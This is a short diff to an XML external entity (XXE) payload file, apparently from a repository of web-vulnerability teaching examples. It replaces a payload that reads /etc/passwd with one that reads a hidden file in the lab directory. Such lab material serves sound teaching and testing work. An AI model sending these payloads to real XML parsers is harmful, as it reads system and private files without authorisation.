@@ -1,1 +1,4 @@
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///var/www/html/Examples-of-Web-Vulnerabilities/XXE/archivo_oculto.txt">
+]>
+<foo>&xxe;</foo>
